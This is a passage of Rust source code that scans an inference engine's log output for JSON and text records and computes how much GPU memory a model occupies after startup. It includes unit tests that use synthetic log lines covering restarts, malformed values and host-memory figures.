    for (i, &byte) in bytes.iter().enumerate() {
        if in_string {
            if escaped {
                escaped = false;
            } else if byte == b'\\' {
                escaped = true;
            } else if byte == b'"' {
                in_string = false;
            }
            continue;
        }
        match byte {
            b'"' => in_string = true,
            b'{' => {
                if depth == 0 {
                    start = i;
                }
                depth += 1;
            }
            b'}' if depth > 0 => {
                depth -= 1;
                if depth == 0 {
                    if let Ok(value) = serde_json::from_slice(&bytes[start..=i]) {
                        objects.push(value);
                    }
                }
            }
            _ => {}
        }
    }
    objects
}

/// Walk a JSON object by key path and read a non-negative integer, tolerating a
/// float or a numeric string (the engine's serialization has not been runtime-
/// confirmed yet — see the Wave C confirmatory capture).
fn lookup_u64(value: &serde_json::Value, path: &[&str]) -> Option<u64> {
    let mut node = value;
    for segment in path {
        node = node.get(*segment)?;
    }
    if let Some(n) = node.as_u64() {
        return Some(n);
    }
    node.as_f64()
        .filter(|f| *f >= 0.0 && *f == f.trunc())
        .map(|f| f as u64)
}

#[cfg(test)]
mod startup_tests {
    use super::*;

    const GIB_B: u64 = 1024 * 1024 * 1024;

    #[test]
    fn parses_the_startup_memory_record_into_required_to_free() {
        let log = "engine booting...\n\
            {\"event\":\"ready\",\"environment\":{\"gpu_name\":\"RTX PRO 5000\",\"total_device_memory_bytes\":77309411328},\
            \"memory\":{\"weights\":{\"capacity_bytes\":8589934592},\"available_after_startup_bytes\":47244640256}}\n";
        let report = parse_startup_memory(log).expect("the record parses");
        // 72 GiB total, 44 GiB free after startup -> 28 GiB reserved.
        assert!(
            (report.required_to_free_gb - 28.0).abs() < 1e-6,
            "was {}",
            report.required_to_free_gb
        );
        assert_eq!(report.total_device_memory_bytes, 72 * GIB_B);
        assert_eq!(report.available_after_startup_bytes, 44 * GIB_B);
    }

    #[test]
    fn a_restart_takes_the_newest_startup_record() {
        let log = "{\"environment\":{\"total_device_memory_bytes\":77309411328},\"memory\":{\"available_after_startup_bytes\":60129542144}}\n\
            filler\n\
            {\"environment\":{\"total_device_memory_bytes\":77309411328},\"memory\":{\"available_after_startup_bytes\":21474836480}}\n";
        let report = parse_startup_memory(log).expect("parses");
        // Newest: 72 - 20 = 52 GiB.
        assert!(
            (report.required_to_free_gb - 52.0).abs() < 1e-6,
            "was {}",
            report.required_to_free_gb
        );
    }

    #[test]
    fn absent_or_nonsense_record_is_none_so_the_caller_falls_back() {
        assert_eq!(parse_startup_memory("no json here at all"), None);
        // available > total is nonsense; must not book a negative.
        let bad = "{\"environment\":{\"total_device_memory_bytes\":1073741824},\
            \"memory\":{\"available_after_startup_bytes\":9999999999}}";
        assert_eq!(parse_startup_memory(bad), None);
        // present fields but zero required (fully free) is not a footprint.
        let zero = "{\"environment\":{\"total_device_memory_bytes\":1073741824},\
            \"memory\":{\"available_after_startup_bytes\":1073741824}}";
        assert_eq!(parse_startup_memory(zero), None);
    }

    #[test]
    fn braces_inside_strings_do_not_desynchronize_the_scan() {
        // A log line whose message contains `{ }` must not be mistaken for an object.
        let log = "{\"msg\":\"weird { } braces here\",\"environment\":{\"total_device_memory_bytes\":77309411328},\"memory\":{\"available_after_startup_bytes\":47244640256}}";
        let report = parse_startup_memory(log).expect("the braces-in-string do not break the scan");
        assert!(report.required_to_free_gb > 0.0);
    }

    /// Ruling 2026-11-01: the startup record is spoken before the weight stream
    /// (live: qwen-fp8 reserved 32.0 at startup, installed 44.1 — witness), so
    /// the engine's own post-ready `weights ready`+`runtime` figures raise the
    /// booking. The host-KV lines (8.00 GiB) in the same vector must never join:
    /// host RAM is not VRAM.
    #[test]
    fn post_ready_lines_raise_the_booking_to_the_installed_footprint() {
        let log = "{\"environment\":{\"total_device_memory_bytes\":75161927680},\
            \"memory\":{\"available_after_startup_bytes\":40802189312}}\n\
            2026-11-01 03:40:32.909 [warning] ninfer-serve: ECC is ENABLED\n\
            2026-11-01 03:41:00.000  INFO  pinning host KV | 8.00 GiB\n\
            2026-11-01 03:43:54.192  INFO  weights ready | 27.5 GiB | 2m 17.6s | 204.6 MiB/s\n\
            2026-11-01 03:44:07.842  INFO  host KV pinned | 8.00 GiB | 8.5s\n\
            2026-11-01 03:44:07.842  INFO  engine ready | qwen3.8-27b-fp8 | total 3m 34.9s | weights 27.5 GiB\n\
            2026-11-01 03:44:07.842  INFO  capacity | KV 262,144 tokens, int8, explicit | pages 4,096/33,554,431 | runtime 16.5 GiB | free 27.4 GiB\n";
        let report = parse_startup_memory(log).expect("parses");
        // startup 70-38 = 32; resident 27.5+16.5 = 44.0 -> the larger books,
        // and the host 8.00 GiB lines never join the sum.
        assert!(
            (report.required_to_free_gb - 44.0).abs() < 1e-6,
            "was {}",
            report.required_to_free_gb
        );
        assert!(parse_resident_footprint(log).is_some_and(|r| (r - 44.0).abs() < 1e-6));
    }

    /// Falsifiers for the raise: an old build that only wrote the JSON record
    /// must book exactly the startup figure; half a pair must not raise it; and
    /// a resident claiming more than the card holds is nonsense, never booked.
    #[test]
    fn the_startup_figure_survives_alone_half_pairs_and_nonsense() {
        // Old build: JSON only (the existing 72-44=28 vector).
        let old = "{\"environment\":{\"total_device_memory_bytes\":77309411328},\
            \"memory\":{\"available_after_startup_bytes\":47244640256}}";
        let report = parse_startup_memory(old).expect("parses");
        assert!((report.required_to_free_gb - 28.0).abs() < 1e-6);

        // Weights without a capacity/runtime line: no pair, no raise.
        let half =
            format!("{old}\n2026-11-01 03:43:54.192  INFO  weights ready | 27.5 GiB | 2m 17.6s\n");
        let report = parse_startup_memory(&half).expect("parses");
        assert!((report.required_to_free_gb - 28.0).abs() < 1e-6);
        assert_eq!(parse_resident_footprint(&half), None);

        // A 66+66 pair on a 70 GiB card exceeds the device: ignored outright.
        let huge =
            format!("{old}\nINFO weights ready | 66.0 GiB\nINFO capacity | runtime 66.0 GiB\n");
        let report = parse_startup_memory(&huge).expect("parses");
        assert!((report.required_to_free_gb - 28.0).abs() < 1e-6);
    }

    /// Review M-2 (live proof): the shipped builds route the startup JSON to
    /// `--request-log-jsonl`, invisible to `docker logs` — the post-ready
    /// triple alone must book, with the total implied by the engine's own
    /// figures. Review M-1: a host-side line merely SAYING `runtime` must
    /// never feed the capacity figures.
    #[test]
    fn the_post_ready_triple_alone_books_and_host_words_cannot_join() {
        let text_only = "2026-11-01 03:43:54.192  INFO  weights ready | 27.5 GiB | 2m 17.6s\n\
            2026-11-01 03:44:07.842  INFO  host KV pinned | 8.00 GiB | 8.5s\n\
            2026-11-01 03:44:07.842  INFO  capacity | KV 262,144 tokens, int8, explicit | runtime 16.5 GiB | free 27.4 GiB\n";
        let report = parse_startup_memory(text_only).expect("the triple books alone");
        assert!((report.required_to_free_gb - 44.0).abs() < 1e-6);
        assert!(
            (report.total_device_memory_bytes as f64 / GIB - 71.4).abs() < 1e-6,
            "total {}",
            report.total_device_memory_bytes
        );

        // A `runtime` word outside any `capacity` line contributes nothing,
        // and no complete triple means no report at all (fallback stays
        // labelled total_diff, never a silent zero).
        let host_words = "INFO weights ready | 27.5 GiB\n\
            WARNING runtime host cache budget | 8.00 GiB total\n";
        assert_eq!(parse_resident_footprint(host_words), None);
        assert_eq!(parse_startup_memory(host_words), None);
    }
}
